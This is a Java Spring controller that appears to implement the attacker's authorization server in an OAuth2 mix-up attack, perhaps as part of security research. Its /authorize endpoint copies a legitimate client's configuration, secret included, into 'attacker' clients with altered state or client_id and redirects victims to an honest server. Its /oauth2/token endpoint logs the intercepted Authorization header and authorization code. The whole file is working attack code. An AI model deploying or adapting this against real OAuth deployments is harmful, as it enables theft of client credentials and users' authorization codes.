package com.gsf.client.api.controller;

import com.gsf.client.api.config.AuthorizationCodeTokenService;
import com.gsf.client.api.entity.ClientTemplate;
import com.gsf.client.api.entity.OAuth2Token;
import com.gsf.client.api.entity.TemplateUrls;
import com.gsf.client.api.entity.UserTemplate;
import com.gsf.client.api.repository.TemplateMemoryRepository;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.ModelAttribute;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestHeader;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.servlet.ModelAndView;

@RestController
@RequestMapping("/authorizationServer")
public class AuthorizationServerController {

    private Logger LOGGER = LoggerFactory.getLogger(AuthorizationServerController.class);

    @Autowired
    private AuthorizationCodeTokenService authorizationCodeTokenService;

    @PostMapping("/login")
    public String greetingSubmit(@ModelAttribute UserTemplate user, Model model) {
        UserTemplate userLogin = TemplateMemoryRepository.findUserByLogin(user.getLogin());
        model.addAttribute("user", userLogin.toString());
        return "result";
    }

    @RequestMapping(value = "/authorize", method = RequestMethod.GET)
    public ModelAndView authorize(String redirect_uri, String state, String client_id) {

        String authorizationEndpoint = null;
        if("fiwarelab_state".equalsIgnoreCase(state)) {
            ClientTemplate client = TemplateMemoryRepository.findById(3); //fiware lab

            ClientTemplate attackerClient = copyValues(client);
            attackerClient.setState("attacker_state");
            authorizationEndpoint = authorizationCodeTokenService.getAuthorizationEndpoint(attackerClient);
        } else {

            ClientTemplate client = TemplateMemoryRepository.findById(1);
            ClientTemplate clientAttacker = copyValues(client);

            clientAttacker.setClientId("tutorial-dckr-site-0000-xpresswebapp");
            clientAttacker.setState(state);

            TemplateUrls urls = new TemplateUrls();
            urls.setUrlAuthorize("http://localhost:3005/oauth2/authorize");
            urls.setRedirectUri(client.getUrls().getRedirectUri());
            clientAttacker.setUrls(urls);

            clientAttacker.setResponseType(client.getResponseType());

            authorizationEndpoint = authorizationCodeTokenService.getAuthorizationEndpoint(clientAttacker);
        }


        //manda pro H-AS
        return new ModelAndView("redirect:" + authorizationEndpoint);
    }

    private ClientTemplate copyValues(ClientTemplate client) {

        ClientTemplate clientCopied = new ClientTemplate();

        clientCopied.setId(client.getId());
        clientCopied.setClientId(client.getClientId());
        clientCopied.setSecret(client.getSecret());
        clientCopied.setResponseType(client.getResponseType());
        clientCopied.setState(client.getState());
        clientCopied.setToken(client.getToken());
        clientCopied.setUrls(client.getUrls());
        clientCopied.setAuthorizationServerName(client.getAuthorizationServerName());

        return clientCopied;
    }


    @PostMapping(value = "/oauth2/token")
    public ResponseEntity token(@RequestHeader("Authorization") String authorization,
                                @RequestBody String body) {

        String authorizationCode = body
                    .split("&")[1]
                    .split("=")[1];

        LOGGER.info("Authorization: " + authorization);
        LOGGER.info("Access Code: " + authorizationCode);

        return ResponseEntity.status(HttpStatus.OK).build();
    }

}
